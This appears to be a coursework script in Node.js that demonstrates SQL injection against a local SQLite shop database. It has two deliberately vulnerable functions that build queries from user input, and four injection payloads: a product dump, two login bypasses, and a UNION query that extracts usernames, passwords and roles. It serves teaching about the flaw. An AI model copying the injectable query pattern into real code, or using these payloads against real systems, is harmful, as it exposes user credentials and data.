const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

function searchProduct(name) {
    // This is vulnerable because it uses a template literal (${name}) [cite: 153]
    const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
    console.log('Query:', query);
    const rows = db.prepare(query).all();
    console.log('Result:', rows, '\n');
    return rows;
}

function login(username, password) {
    // This is vulnerable because it puts user input directly into the string [cite: 160]
    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    console.log('Query:', query);
    const row = db.prepare(query).get();
    console.log('Result:', row, '\n');
    return row;
}

// --- TASK 3 ATTACK CALLS ---

console.log("--- Attack 1: Dump All Products ---");
searchProduct("' OR 1=1--"); 

console.log("--- Attack 2: Login Bypass (No Password) ---");
login("admin'--", "anything"); 

console.log("--- Attack 3: Always True Login ---");
login("' OR '1'='1", "' OR '1'='1"); 

console.log("--- Attack 4: UNION Attack (Steal User Data) ---");
searchProduct("' UNION SELECT id, username, password, role FROM users--"); 